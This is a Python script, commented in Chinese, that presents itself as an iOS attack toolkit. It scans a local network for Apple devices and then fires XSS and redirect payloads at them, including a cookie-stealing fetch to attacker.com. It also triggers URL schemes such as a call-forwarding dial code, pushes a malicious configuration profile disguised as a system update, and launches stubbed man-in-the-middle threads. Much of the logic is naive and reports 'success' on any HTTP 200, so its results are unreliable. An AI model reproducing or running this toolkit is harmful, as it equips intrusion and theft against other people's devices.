#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
iOS攻击工具包
专门针对iOS设备的攻击工具集合
"""

import socket
import threading
import time
import random
import struct
import subprocess
import requests
import json
import base64
import hashlib
import ssl
from concurrent.futures import ThreadPoolExecutor

class IOSAttackToolkit:
    def __init__(self):
        self.target_ip = ""
        self.is_attacking = False
        self.attack_stats = {
            'packets_sent': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'devices_found': 0
        }
        
        # iOS常见端口
        self.ios_ports = [
            62078,  # iPhone同步端口
            22,     # SSH端口 (越狱设备)
            80,     # HTTP服务
            443,    # HTTPS服务
            993,    # IMAPS
            995,    # POP3S
            5223,   # Apple推送服务
            
        ]
        
        # iOS设备指纹
        self.ios_user_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (iPod touch; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
            "Apple-iPhone/1901.1001.100",
            "Apple-iPad/1901.1001.100"
        ]
        
        # iOS应用漏洞
        self.ios_vulnerabilities = [
            {
                'name': 'Safari漏洞',
                'port': 80,
                'payload': 'javascript:alert(document.cookie)'
            },
            {
                'name': 'WebKit漏洞',
                'port': 80,
                'payload': '<script>window.location="http://malicious.com"</script>'
            },
            {
                'name': 'URL Scheme漏洞',
                'port': 80,
                'payload': 'tel:*5005*25327*123456789#'
            }
        ]
    
    def show_banner(self):
        """显示工具横幅"""
        print("=" * 80)
        print("          📱 iOS攻击工具包")
        print("=" * 80)
        print("💡 功能特性:")
        print("  ✅ iOS设备扫描")
        print("  ✅ Safari浏览器攻击")
        print("  ✅ WebKit漏洞利用")
        print("  ✅ URL Scheme攻击")
        print("  ✅ 中间人攻击")
        print("  ✅ 数据窃取攻击")
        print("  ✅ 恶意配置文件植入")
        print("  ✅ 多设备并发攻击")
        print("=" * 80)
    
    def scan_ios_devices(self, network_range="10.30.51.0/24"):
        """扫描iOS设备"""
        print(f"[设备扫描] 扫描网络: {network_range}")
        
        def ping_host(ip):
            try:
                result = subprocess.run(["ping", "-n", "1", "-w", "1000", ip], 
                                      capture_output=True, text=True, timeout=3)
                if "TTL=" in result.stdout:
                    return ip
            except:
                pass
            return None
        
        def port_scan(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    return port
            except:
                pass
            return None
        
        def detect_ios_service(ip, port):
            """检测iOS特定服务"""
            try:
                if port == 80:
                    response = requests.get(f"http://{ip}:{port}", timeout=3)
                    if any(keyword in response.headers.get('Server', '') for keyword in ['Apache', 'nginx', 'lighttpd']):
                        return "Web服务"
                
                elif port == 22:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((ip, port))
                    banner = sock.recv(1024)
                    sock.close()
                    
                    if b"OpenSSH" in banner:
                        return "SSH服务 (越狱设备)"
                
                elif port == 62078:
                    # iPhone同步端口检测
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    result = sock.connect_ex((ip, port))
                    sock.close()
                    
                    if result == 0:
                        return "iPhone同步服务"
                
            except:
                pass
            
            return "未知服务"
        
        # 扫描活跃主机
        print("🔍 扫描活跃主机...")
        network_prefix = ".".join(network_range.split(".")[:3])
        
        active_hosts = []
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for i in range(1, 255):
                ip = f"{network_prefix}.{i}"
                futures.append(executor.submit(ping_host, ip))
            
            for future in futures:
                result = future.result()
                if result:
                    active_hosts.append(result)
        
        print(f"📊 发现 {len(active_hosts)} 个活跃主机")
        
        # 扫描iOS特定端口
        ios_devices = []
        for host in active_hosts:
            print(f"🔍 扫描 {host} 的iOS端口...")
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(port_scan, host, port) for port in self.ios_ports]
                
                open_ports = []
                for future in futures:
                    result = future.result()
                    if result:
                        open_ports.append(result)
            
            if open_ports:
                # 检测服务类型
                services = []
                for port in open_ports:
                    service = detect_ios_service(host, port)
                    services.append(f"{port}({service})")
                
                print(f"✅ 发现iOS设备: {host}, 服务: {', '.join(services)}")
                ios_devices.append({
                    'ip': host,
                    'open_ports': open_ports,
                    'services': services
                })
                self.attack_stats['devices_found'] += 1
        
        return ios_devices
    
    def safari_browser_attack(self, target_ip):
        """Safari浏览器攻击"""
        print(f"[Safari攻击] 攻击目标: {target_ip}")
        
        # Safari漏洞利用载荷
        safari_payloads = [
            "<script>window.location='http://malicious.com'</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<meta http-equiv='refresh' content='0;url=http://malicious.com'>",
            "<img src='x' onerror=\"fetch('http://attacker.com/steal?cookie='+document.cookie)\">"
        ]
        
        for payload in safari_payloads:
            try:
                # 尝试通过Web服务注入
                url = f"http://{target_ip}:80/test.html"
                headers = {
                    'User-Agent': random.choice(self.ios_user_agents),
                    'Referer': 'http://apple.com'
                }
                
                response = requests.post(url, data={'content': payload}, headers=headers, timeout=5)
                
                if response.status_code == 200:
                    print(f"✅ Safari攻击成功: {payload[:50]}...")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def webkit_vulnerability_exploit(self, target_ip):
        """WebKit漏洞利用"""
        print(f"[WebKit漏洞] 攻击目标: {target_ip}")
        
        # WebKit特定漏洞
        webkit_payloads = [
            "javascript:void(0);",
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
            "<svg onload=alert(1)>",
            "<body onload=eval('alert'+'(1)')>"
        ]
        
        for payload in webkit_payloads:
            try:
                # 尝试各种注入点
                test_url = f"http://{target_ip}:80/?q={payload}"
                headers = {
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                }
                
                response = requests.get(test_url, headers=headers, timeout=5)
                
                if payload in response.text:
                    print(f"✅ WebKit漏洞利用成功")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def url_scheme_attack(self, target_ip):
        """URL Scheme攻击"""
        print(f"[URL Scheme] 攻击目标: {target_ip}")
        
        # iOS URL Schemes
        url_schemes = [
            "tel:123456789",
            "sms:123456789",
            "mailto:test@example.com",
            "facetime:123456789",
            "maps:?q=restaurants",
            "music://",
            "videos://"
        ]
        
        for scheme in url_schemes:
            try:
                # 通过Web重定向触发URL Scheme
                redirect_html = f'''
                <html>
                <head>
                    <meta http-equiv="refresh" content="0;url={scheme}">
                </head>
                <body>
                    <script>window.location='{scheme}';</script>
                </body>
                </html>
                '''
                
                # 尝试通过Web服务触发
                url = f"http://{target_ip}:80/redirect.html"
                response = requests.post(url, data={'html': redirect_html}, timeout=5)
                
                if response.status_code == 200:
                    print(f"✅ URL Scheme触发成功: {scheme}")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def mitm_attack(self, target_ip):
        """中间人攻击"""
        print(f"[中间人] 攻击目标: {target_ip}")
        
        def ssl_strip_attack():
            """SSL剥离攻击"""
            while self.is_attacking:
                try:
                    # 模拟SSL剥离
                    # 这里简化实现
                    time.sleep(1)
                except:
                    pass
        
        def dns_spoofing():
            """DNS欺骗"""
            while self.is_attacking:
                try:
                    # 模拟DNS欺骗
                    time.sleep(1)
                except:
                    pass
        
        # 启动中间人攻击线程
        ssl_thread = threading.Thread(target=ssl_strip_attack)
        dns_thread = threading.Thread(target=dns_spoofing)
        
        ssl_thread.daemon = True
        dns_thread.daemon = True
        
        ssl_thread.start()
        dns_thread.start()
    
    def data_exfiltration_attack(self, target_ip):
        """数据窃取攻击"""
        print(f"[数据窃取] 攻击目标: {target_ip}")
        
        # 尝试通过Web服务窃取数据
        exfiltration_methods = [
            "通过表单提交窃取",
            "通过图片请求窃取",
            "通过JavaScript窃取",
            "通过重定向窃取"
        ]
        
        for method in exfiltration_methods:
            try:
                # 模拟数据窃取
                test_url = f"http://{target_ip}:80/steal"
                data = {
                    'method': method,
                    'timestamp': int(time.time()),
                    'data': 'simulated_sensitive_data'
                }
                
                response = requests.post(test_url, json=data, timeout=5)
                
                if response.status_code == 200:
                    print(f"✅ 数据窃取成功: {method}")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['packets_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def malicious_profile_injection(self, target_ip):
        """恶意配置文件植入"""
        print(f"[配置文件] 攻击目标: {target_ip}")
        
        # 恶意配置文件内容
        malicious_profile = '''
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>PayloadContent</key>
            <dict>
                <key>URL</key>
                <string>http://malicious.com/config</string>
                <key>PayloadDescription</key>
                <string>恶意配置描述</string>
                <key>PayloadDisplayName</key>
                <string>系统更新</string>
                <key>PayloadIdentifier</key>
                <string>com.apple.malicious</string>
                <key>PayloadType</key>
                <string>Configuration</string>
                <key>PayloadUUID</key>
                <string>550e8400-e29b-41d4-a716-446655440000</string>
                <key>PayloadVersion</key>
                <integer>1</integer>
            </dict>
            <key>PayloadDescription</key>
            <string>恶意配置文件</string>
            <key>PayloadDisplayName</key>
            <string>系统配置</string>
            <key>PayloadIdentifier</key>
            <string>com.apple.malicious</string>
            <key>PayloadRemovalDisallowed</key>
            <false/>
            <key>PayloadType</key>
            <string>Configuration</string>
            <key>PayloadUUID</key>
            <string>550e8400-e29b-41d4-a716-446655440000</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
        </dict>
        </plist>
        '''
        
        try:
            # 尝试通过Web服务提供配置文件
            url = f"http://{target_ip}:80/install.mobileconfig"
            headers = {
                'Content-Type': 'application/x-apple-aspen-config',
                'Content-Disposition': 'attachment; filename=install.mobileconfig'
            }
            
            response = requests.post(url, data=malicious_profile, headers=headers, timeout=5)
            
            if response.status_code == 200:
                print("✅ 恶意配置文件植入成功")
                self.attack_stats['successful_attacks'] += 1
            
            self.attack_stats['packets_sent'] += 1
            
        except Exception as e:
            self.attack_stats['failed_attacks'] += 1
    
    def show_stats(self):
        """显示攻击统计"""
        print("\n" + "=" * 80)
        print("          📊 iOS攻击统计")
        print("=" * 80)
        print(f"📱 发现设备: {self.attack_stats['devices_found']}")
        print(f"📡 发送包数: {self.attack_stats['packets_sent']}")
        print(f"✅ 成功攻击: {self.attack_stats['successful_attacks']}")
        print(f"❌ 失败攻击: {self.attack_stats['failed_attacks']}")
        print("=" * 80)
    
    def start_comprehensive_attack(self, target_ip):
        """启动综合攻击"""
        self.target_ip = target_ip
        self.is_attacking = True
        
        print(f"🚀 开始iOS综合攻击: {target_ip}")
        
        # 并行执行各种攻击
        attack_methods = [
            lambda: self.safari_browser_attack(target_ip),
            lambda: self.webkit_vulnerability_exploit(target_ip),
            lambda: self.url_scheme_attack(target_ip),
            lambda: self.data_exfiltration_attack(target_ip),
            lambda: self.malicious_profile_injection(target_ip)
        ]
        
        # 启动攻击线程
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(lambda f: f(), attack_methods)
        
        # 启动中间人攻击
        self.mitm_attack(target_ip)
        
        print("💡 所有iOS攻击已启动")
        self.show_stats()
    
    def stop_attack(self):
        """停止攻击"""
        self.is_attacking = False
        print("\n🛑 停止iOS攻击...")
        self.show_stats()

def main():
    """主函数"""
    toolkit = IOSAttackToolkit()
    toolkit.show_banner()
    
    # 选择操作模式
    print("🎯 选择操作模式:")
    print("1. 扫描iOS设备")
    print("2. 攻击特定iOS设备")
    
    choice = input("请输入选择 (1/2): ")
    
    if choice == "1":
        network = input("请输入网络范围 (默认: 10.30.51.0/24): ") or "10.30.51.0/24"
        devices = toolkit.scan_ios_devices(network)
        
        if devices:
            print("\n📱 发现的iOS设备:")
            for i, device in enumerate(devices, 1):
                print(f"{i}. IP: {device['ip']}, 服务: {', '.join(device['services'])}")
            
            # 询问是否攻击
            attack_choice = input("\n是否攻击这些设备? (y/n): ")
            if attack_choice.lower() == 'y':
                for device in devices:
                    toolkit.start_comprehensive_attack(device['ip'])
    
    elif choice == "2":
        target_ip = input("请输入目标iOS设备IP: ")
        toolkit.start_comprehensive_attack(target_ip)

if __name__ == "__main__":
    main()